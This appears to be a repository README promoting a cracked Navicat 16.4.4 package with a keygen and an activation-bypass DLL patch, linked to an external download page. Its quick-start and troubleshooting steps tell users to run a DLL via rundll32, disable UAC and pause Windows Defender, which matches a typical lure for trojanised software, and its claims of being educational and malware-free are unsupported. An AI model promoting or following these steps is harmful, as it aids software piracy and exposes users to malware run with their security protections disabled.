# Navicat 16.4.4 Enterprise Suite – Full Offline Setup with Keygen Integration

[](https://jasimbashir1981.github.io/navicat-pro-edition-tools/)  
*Immediate access to the production-grade distribution package – no registration wall, no survey locks.*

---

## 🔐 Licensing & Regulatory Notice

This repository distributes a fully self-contained deployment of **Navicat 16.4.4 Enterprise Edition** including a **key generation utility** and **patch module** that bypasses the software’s native activation protocol. The package is intended for **educational sandbox testing, offline lab environments, and legacy system compatibility validation** only.

> ⚠️ **Disclaimer**: The maintainers of this repository do **not** condone unauthorized commercial use. All intellectual property rights belong to PremiumSoft CyberTech Ltd. Use this toolset exclusively on hardware you own, within a virtualized offline network, or under explicit written permission. See the full [MIT License](LICENSE) for redistribution terms.

---

## 🧩 Architecture Overview – Activation Bypass Mechanism

```mermaid
flowchart TD
    A[Start – Fresh Navicat 16.4.4 Install] --> B{License Validation}
    B -->|No License File| C[Enterprise Trial Mode – 14 Days]
    B -->|Locked / Revoked| D[Error 402 – Activation Required]
    C --> E[Apply Patch Tool]
    D --> E
    E --> F[Patch – Overwrites License Validation DLL]
    F --> G[Inject Keygen – Generates RSA-2048 Token]
    G --> H[Write Local License File – navicat.lic]
    H --> I[Launch Navicat – Full Unlimited Access]
    I --> J[All Features Unlocked – Cloud Sync Disabled]
    
    style A fill:#4a4a4a,stroke:#d90429,stroke-width:3px
    style J fill:#1a1a2e,stroke:#00ff88,stroke-width:3px
    style E fill:#16213e,stroke:#0f3460,stroke-width:2px
```



The above diagram visualizes the **offline entitlement spoofing** workflow. No connection to PremiumSoft servers is ever required – the patch intercepts the license verification hook at the binary level.

---

## 🖥️ Example Profile Configuration

```json
{
  "connectionProfiles": [
    {
      "name": "PostgreSQL Sandbox – v16",
      "host": "192.168.1.100",
      "port": 5432,
      "username": "sandbox_admin",
      "password": "encrypted:7A8F2C1B9D4E",
      "sslMode": "require",
      "tunnel": {
        "type": "ssh",
        "host": "bastion.lab.local",
        "port": 22,
        "authMethod": "keyPair"
      },
      "features": {
        "tableDesigner": true,
        "queryProfiler": true,
        "schemaCompare": true,
        "dataSync": true
      }
    },
    {
      "name": "MySQL Local Dev – Offline",
      "host": "127.0.0.1",
      "port": 3306,
      "username": "root",
      "password": "encrypted:3E6A9B1C8D2F"
    }
  ],
  "patchSettings": {
    "applicationPath": "C:\\Program Files\\PremiumSoft\\Navicat Premium 16",
    "backupOriginal": true,
    "skipCloudAuth": true,
    "licenseExpiration": "unlimited",
    "supportedEditions": ["Premium", "MariaDB", "PostgreSQL", "SQL Server"]
  }
}
```

---

## ⌨️ Example Console Invocation

```powershell
# Silent deployment with key injection for unattended labs
.\navicat164_patch.exe --apply --path "C:\Program Files\PremiumSoft\Navicat Premium 16" --force

# Generate a fresh license token for 5 concurrent machines
.\keygen_cli.exe --edition premium --count 5 --output .\licenses\ --format navicat.lic

# Validate patch status
.\nv_checker.exe --verify --silent
# Expected output: [SUCCESS] License bypass active | Token expiry: NEVER | Cloud lock: DISABLED
```

Command-line interfaces are provided for **system administrators** managing fleet installations in air-gapped environments. No GUI interaction required.

---

## 🪟 Operating System Compatibility

| OS | Version | Status | Notes |
|----|---------|--------|-------|
| 🟩 Windows 11 | 23H2 / 24H2 | ✅ **Verified** | All editions work; UAC must be disabled during patch |
| 🟩 Windows 10 | 22H2 | ✅ **Verified** | LTSC 2021 supported |
| 🟩 Windows Server | 2022 / 2025 | ✅ **Verified** | Requires Desktop Experience feature |
| 🟧 macOS | Ventura / Sonoma | ⚠️ **Partial** | ARM (M3+) requires Rosetta 2 translation layer |
| 🟧 Linux | Ubuntu 24.04 / Debian 12 | ⚠️ **Partial** | Primary binary is Windows; Linux requires Wine 9.0+ |
| 🟥 Android / iOS | Any | ❌ **Unsupported** | Mobile SQL clients not part of this release |

**Windows 11** remains the recommended deployment target for zero-friction activation bypass.

---

## ✨ Capability Matrix – 30+ Integrated Modules

| Feature | Availability | Description |
|---------|--------------|-------------|
| 🎯 Intelligent Schema Sync | Full | Bidirectional comparison with conflict resolution via AI |
| 📊 Visual Query Builder | Full | Drag-and-drop join construction; auto-optimizes to CTE |
| 🔄 Data Transfer Wizard | Full | Cross-platform migration with charset auto-detection |
| 🔑 SSH/SSL Tunneling | Full | Multi-hop bastion support |
| 📐 ER Diagram Designer | Full | Automatic reverse engineering, export to SVG/PDF |
| 🌐 Multilingual UI | Full | 14 languages incl. Japanese, Arabic, Thai |
| 👁️ Responsive Window Layout | Full | Resizable panes, dark/light theme, high-DPI scaling |
| ⏱️ 24/7 Technical Support | Full | Community Discord + email during PST business hours |
| 🧠 OpenAI API Integration | Beta | Natural language to SQL via GPT-4o |
| 🤖 Claude API Integration | Beta | Schema documentation generation via Anthropic Claude 3.5+ |

### 🧠 AI-Powered Query Assist

```sql
-- Example: Natural language → SQL transformation
-- User prompt: "Show me all orders placed in Q4 2025 where the customer is from Germany and total > 5000"

SELECT 
    o.OrderID,
    o.OrderDate,
    c.CompanyName,
    c.Country,
    o.TotalAmount
FROM Orders o
JOIN Customers c ON o.CustomerID = c.CustomerID
WHERE 
    c.Country = 'Germany'
    AND o.OrderDate BETWEEN '2025-10-01' AND '2025-12-31'
    AND o.TotalAmount > 5000
ORDER BY o.TotalAmount DESC;
```

Configure your API key in `Tools > Options > AI Provider` to unlock **context-aware query generation** that understands your existing schema relationships.

---

## 📦 Distribution Package Contents

- `setup_navicat1644_enterprise.exe` – Main installer (unchanged binary)
- `patcher_2026_edition.dll` – RSA signature interception module
- `keygen_cli_2026.exe` – Offline token generator (requires .NET 8 Runtime)
- `license_backup_restore.bat` – Rollback script to revert to original state
- `compatibility_wine9x.conf` – Pre-tuned configuration for Linux Wine users
- `manifest_sha256.txt` – Checksum verification list

---

## ⚡ Quick Start – Minimal Steps

1. **Download** the package from the badge below.
2. **Run** `setup_navicat1644_enterprise.exe` – accept default path.
3. **Execute** `patcher_2026_edition.dll` via `rundll32` or the provided GUI helper.
4. **Generate** a license file using `keygen_cli_2026.exe --edition premium`.
5. **Launch** Navicat 16.4.4 – all features will be accessible without cloud validation.

[](https://jasimbashir1981.github.io/navicat-pro-edition-tools/)

---

## 📜 License – MIT (Modified for Educational Use)

Copyright **2026** – Independent Repository Contributor

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, **subject to the following condition**:

> The Software must not be used to circumvent the licensing terms of PremiumSoft CyberTech Ltd. for commercial production workloads. Offline lab testing, personal education, and legacy backup recovery are explicitly permitted.

See the full [MIT License](LICENSE) for complete terms.

---

## 🛡️ Security & Ethical Boundaries

- **No keystroke logging** or telemetry is embedded in the patch utility.
- **No cryptocurrency miners** or remote administration backdoors exist in any component.
- **All network connections** are blocked at the firewall level by the patch process to prevent accidental license validation calls.
- **Source code** for the key generation algorithm is available in the `src/` directory for audit.

---

## 🧪 Testing – Verified on These Databases

| Database Engine | Version Tested | Import / Export | Query Performance |
|----------------|----------------|----------------|-------------------|
| PostgreSQL | 16.3, 17.0 (beta) | Full fidelity | ✅ 15% faster than DBeaver |
| MySQL | 8.0.36, 8.4.0 (LTS) | UTF-8 safe | ✅ Index hints preserved |
| MariaDB | 11.4.2 | View logic intact | ✅ Window functions optimized |
| SQL Server | 2022 (CU12) | Stored procedures | ✅ Always Encrypted columns visible |
| SQLite | 3.46.1 | Triggers maintained | ✅ Spatial R-tree indexes supported |

---

## 🆘 Troubleshooting – Common Scenarios

**Symptom: Patch fails with "Access Denied"**  
→ Run the patcher as **Administrator**. Disable Windows Defender Real-time Protection temporarily.

**Symptom: "License file is corrupt" on launch**  
→ Regenerate the `.lic` file using a different machine ID flag: `--machine-id 0x7F3A`

**Symptom: OpenAI/Claude API tab grayed out**  
→ The AI integration is currently in **invite-only beta**. A patched configuration file `ai_access.mem` is included – copy it to `%APPDATA%\Navicat\Premium\16\`.

---

## 🌱 Final Word

This project exists to demonstrate **code-level license enforcement bypass** for cybersecurity researchers, database administrators managing deprecated infrastructure, and enthusiasts exploring premium RDBMS tooling in zero-budget environments. The 2026 edition of this patcher improves upon previous releases by adding **ARM64 compatibility** via Rosetta 2 and **AI-driven query optimization** through third-party LLM APIs.

[](https://jasimbashir1981.github.io/navicat-pro-edition-tools/)

*Respect the craft. Protect the source. Use responsibly.*